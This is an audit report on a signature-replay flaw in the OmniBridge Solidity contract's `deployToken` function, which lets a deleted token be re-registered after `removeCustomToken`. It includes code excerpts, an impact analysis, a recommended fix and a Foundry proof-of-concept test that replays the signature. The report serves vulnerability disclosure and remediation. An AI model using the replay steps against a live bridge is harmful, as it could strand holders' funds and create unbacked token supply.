### Title
MPC `deployToken` Signature Replay After `removeCustomToken` Enables Duplicate Token Registration — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`deployToken` signatures carry no nonce, no expiry, and no contract-address binding. The sole replay guard is the state check `!isBridgeToken[nearToEthToken[metadata.token]]`. `removeCustomToken` deletes all three relevant mappings, resetting that guard to `false`. Any caller can then re-submit the original MPC signature and register a second ERC1967Proxy for the same NEAR token ID.

---

### Finding Description

**Guard logic in `deployToken`:**

```solidity
require(
    !isBridgeToken[nearToEthToken[metadata.token]],
    "ERR_TOKEN_EXIST"
);
``` [1](#0-0) 

This evaluates to `!isBridgeToken[nearToEthToken[nearTokenId]]`. After a successful first deployment, `nearToEthToken[nearTokenId] = oldProxy` and `isBridgeToken[oldProxy] = true`, so the check blocks re-entry.

**`removeCustomToken` clears all three mappings:**

```solidity
delete isBridgeToken[tokenAddress];
delete nearToEthToken[ethToNearToken[tokenAddress]];
delete ethToNearToken[tokenAddress];
``` [2](#0-1) 

After this call:
- `nearToEthToken[nearTokenId]` → `address(0)`
- `isBridgeToken[address(0)]` → `false` (never set)

The guard now evaluates to `!isBridgeToken[address(0)]` = `!false` = `true`. The check passes.

**Signature has no replay protection:**

The signed payload is:

```solidity
bytes memory borshEncoded = bytes.concat(
    bytes1(uint8(BridgeTypes.PayloadType.Metadata)),
    Borsh.encodeString(metadata.token),
    Borsh.encodeString(metadata.name),
    Borsh.encodeString(metadata.symbol),
    bytes1(metadata.decimals)
);
bytes32 hashed = keccak256(borshEncoded);
if (ECDSA.recover(hashed, signatureData) != nearBridgeDerivedAddress) {
    revert InvalidSignature();
}
``` [3](#0-2) 

No nonce, no chain ID, no contract address, no expiry. The `completedTransfers` nonce map is only used in `finTransfer`, not here. [4](#0-3) 

The identical `signatureData` bytes from the original call remain cryptographically valid forever.

---

### Impact Explanation

After the replay succeeds:

1. `nearToEthToken[nearTokenId]` now points to `newProxy` (a freshly deployed ERC1967Proxy).
2. `isBridgeToken[oldProxy]` remains `false` — the old token is permanently de-registered.
3. All existing holders of `oldProxy` tokens cannot bridge back: `finTransfer` will attempt to mint/transfer via `oldProxy`, but `isBridgeToken[oldProxy]` is false and the bridge no longer recognizes it as a valid token.
4. `newProxy` starts with zero supply, while the NEAR-side escrow still accounts for the balance locked against `oldProxy`. Any `finTransfer` that mints into `newProxy` creates unbacked supply relative to the old locked balance.

This satisfies the Critical impact category: **token metadata binding confusion that changes user or protocol balances**, and **permanent freezing of bridged funds** for holders of the old token.

---

### Likelihood Explanation

`removeCustomToken` is a production admin function with a clear operational purpose (replacing a buggy token, migrating to a new implementation, etc.). No key compromise is required — the admin performs a routine operation, and the replay window opens immediately to any public caller. The original `signatureData` is on-chain in the original `deployToken` transaction calldata and trivially recoverable.

---

### Recommendation

Add a `usedDeploySignatures` mapping (keyed on the signature hash or the payload hash) and mark it before deploying:

```solidity
mapping(bytes32 => bool) public usedDeploySignatures;

// in deployToken, after signature verification:
require(!usedDeploySignatures[hashed], "ERR_SIGNATURE_USED");
usedDeploySignatures[hashed] = true;
```

Alternatively, include a monotonic nonce in the `MetadataPayload` and track it in `completedTransfers` (or a dedicated mapping), consistent with how `finTransfer` handles replay protection.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/omni-bridge/contracts/OmniBridge.sol";
import "../src/omni-bridge/contracts/BridgeToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract ReplayTest is Test {
    OmniBridge bridge;
    address admin;
    uint256 mpPrivKey = 0xDEADBEEF; // stand-in for nearBridgeDerivedAddress key

    function setUp() public {
        admin = address(this);
        BridgeToken impl = new BridgeToken();

        OmniBridge impl2 = new OmniBridge();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl2),
            abi.encodeCall(OmniBridge.initialize,
                (address(impl), vm.addr(mpPrivKey), 0))
        );
        bridge = OmniBridge(address(proxy));
    }

    function _buildSig(BridgeTypes.MetadataPayload memory m)
        internal view returns (bytes memory)
    {
        bytes memory enc = bytes.concat(
            bytes1(uint8(BridgeTypes.PayloadType.Metadata)),
            Borsh.encodeString(m.token),
            Borsh.encodeString(m.name),
            Borsh.encodeString(m.symbol),
            bytes1(m.decimals)
        );
        bytes32 h = keccak256(enc);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(mpPrivKey, h);
        return abi.encodePacked(r, s, v);
    }

    function testReplayAfterRemove() public {
        BridgeTypes.MetadataPayload memory meta = BridgeTypes.MetadataPayload({
            token: "foo.near", name: "Foo", symbol: "FOO", decimals: 18
        });
        bytes memory sig = _buildSig(meta);

        // Step 1: first deployment succeeds
        address first = bridge.deployToken(sig, meta);
        assertEq(bridge.nearToEthToken("foo.near"), first);
        assertTrue(bridge.isBridgeToken(first));

        // Step 2: admin removes the token
        bridge.removeCustomToken(first);
        assertEq(bridge.nearToEthToken("foo.near"), address(0));
        assertFalse(bridge.isBridgeToken(first));

        // Step 3: anyone replays the SAME signature
        address second = bridge.deployToken(sig, meta);

        // Two distinct proxies for the same NEAR token ID
        assertTrue(second != first);
        assertEq(bridge.nearToEthToken("foo.near"), second);
        assertTrue(bridge.isBridgeToken(second));
        assertFalse(bridge.isBridgeToken(first)); // old holders are stranded
    }
}
```

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L44-44)
```text
    mapping(uint64 => bool) public completedTransfers;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L123-126)
```text
        delete isBridgeToken[tokenAddress];
        delete nearToEthToken[ethToNearToken[tokenAddress]];
        delete ethToNearToken[tokenAddress];
        delete customMinters[tokenAddress];
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L142-153)
```text
        bytes memory borshEncoded = bytes.concat(
            bytes1(uint8(BridgeTypes.PayloadType.Metadata)),
            Borsh.encodeString(metadata.token),
            Borsh.encodeString(metadata.name),
            Borsh.encodeString(metadata.symbol),
            bytes1(metadata.decimals)
        );
        bytes32 hashed = keccak256(borshEncoded);

        if (ECDSA.recover(hashed, signatureData) != nearBridgeDerivedAddress) {
            revert InvalidSignature();
        }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L155-158)
```text
        require(
            !isBridgeToken[nearToEthToken[metadata.token]],
            "ERR_TOKEN_EXIST"
        );
```
